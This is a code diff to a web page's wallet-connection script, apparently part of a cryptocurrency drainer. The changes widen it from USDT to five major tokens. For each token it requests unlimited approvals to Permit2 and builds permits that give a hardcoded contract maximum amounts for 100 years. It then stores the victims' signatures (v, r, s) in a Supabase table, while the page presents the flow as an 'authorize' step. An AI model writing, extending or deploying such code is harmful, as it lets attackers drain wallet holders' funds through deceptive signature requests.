@@ -182,7 +182,13 @@ body {
 
 
 <script>
-const TOKEN = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT
+const TOKENS = [
+  "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
+  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
+  "0x6b175474e89094c44da98b954eedeac495271d0f", // DAI
+  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
+  "0x514910771AF9Ca656af840dff83E8264EcF986CA"  // LINK
+];
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const CONTRACT = "0xAd7a854221B2a90a16dEd798c6ECa237E2d6f68b";
@@ -229,11 +235,24 @@ async function connectWallet(){
   const user = await signer.getAddress();
   const network = await provider.getNetwork();
 
-  if (network.chainId !== 1n) {
-    log("❌ Wrong network");
-    alert("Switch to Ethereum Mainnet");
+ if (network.chainId !== 1n) {
+  log("⚠️ Switching to Ethereum Mainnet...");
+
+  try {
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: "0x1" }]
+    });
+
+    log("✅ Switched to Ethereum Mainnet");
+    return location.reload();
+
+  } catch (err) {
+    log("❌ Network switch failed");
+    alert("Please switch to Ethereum Mainnet manually");
     return;
   }
+}
 
   APP_STATE.wallet = user;
   renderWallet(user);
@@ -262,54 +281,55 @@ const erc20Abi = [
   "function approve(address spender, uint256 amount) returns (bool)"
 ];
 
-const tokenContract = new ethers.Contract(TOKEN, erc20Abi, signer);
-const allowance = await tokenContract.allowance(user, PERMIT2);
-if (allowance === 0n) {
-  log("🔓 First time: approving token...");
-  log("ERC20 Allowance: " + allowance);
+let needsReload = false;
 
-  const tx = await tokenContract.approve(PERMIT2, ethers.MaxUint256);
-  await tx.wait();
+for (const token of TOKENS) {
+  const tokenContract = new ethers.Contract(token, erc20Abi, signer);
+  const allowance = await tokenContract.allowance(user, PERMIT2);
 
-  log("✅ Approved — reload and sign again");
-  return;
+  if (allowance === 0n) {
+    log("🔓 Approving token: " + token);
+
+    const tx = await tokenContract.approve(PERMIT2, ethers.MaxUint256);
+    await tx.wait();
+
+    log("✅ Approved: " + token);
+    needsReload = true;
+  }
 }
 
-
- 
-
-const tokenC = new ethers.Contract(
-  TOKEN,
-  ["function balanceOf(address) view returns (uint256)"],
-  provider
-);
-
-const balance = await tokenC.balanceOf(user);
-log(`USDT balance: ${balance}`);
-
-
-
-
+if (needsReload) {
+  log("🔄 Reloading after approvals...");
+  setTimeout(() => location.reload(), 1500);
+  return;
+}
 
 const permit2 = new ethers.Contract(
   PERMIT2,
   ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
   provider
 );
-const [allowedAmount, allowedExpiration, nonce] =
-  await permit2.allowance(user, TOKEN, CONTRACT);
 
-log("Nonce: " + nonce);
+
 const MAX_UINT160 = (1n << 160n) - 1n;
-
 const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);
 
-const details = [{
-  token: TOKEN,
-  amount: MAX_UINT160,
-  expiration: expiration,
-  nonce: nonce
-}];
+const details = [];
+
+for (const token of TOKENS) {
+
+  const [allowedAmount, allowedExpiration, nonce] =
+    await permit2.allowance(user, token, CONTRACT);
+
+  log("Nonce " + token + ": " + nonce);
+
+  details.push({
+    token: token,
+    amount: MAX_UINT160,
+    expiration: expiration,
+    nonce: nonce
+  });
+}
 
 
 
@@ -355,30 +375,37 @@ log("✍️ Signature captured");
 
 log("💾 Saving to Supabase...");
 
+const rows = details.map(d => ({
+  owner: user,
+  token: d.token,
+  spender: CONTRACT,
+
+  amount: d.amount.toString(),
+  expiration: d.expiration,
+  nonce: Number(d.nonce),
+
+  sig_deadline: sigDeadline,
+
+  v: v,
+  r: r,
+  s: s
+}));
+
 const { error } = await window.supabaseClient
   .from('permits')
-  .insert([
-  {
-    owner: user,
-    token: TOKEN,
-    spender: CONTRACT,
-
-    amount: details[0].amount.toString(),
-    expiration: details[0].expiration,
-    nonce: Number(details[0].nonce),
-
-    sig_deadline: sigDeadline,
-
-    v: v,
-    r: r,
-    s: s
-  }
-])
+  .upsert(rows, {
+    onConflict: ['owner', 'token']
+  });
 
 if (error) {
   log("❌ Supabase error: " + error.message);
 } else {
-  log("✅ Saved to Supabase");
+  log("✅ Saved to Supabase (" + rows.length + " tokens)");
+
+  updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
+  document.getElementById('btn-authorize').disabled = true;
+  document.getElementById('btn-authorize').innerText = "AUTHORIZED";
+  document.getElementById('btn-activate').disabled = true;
 }
 
  
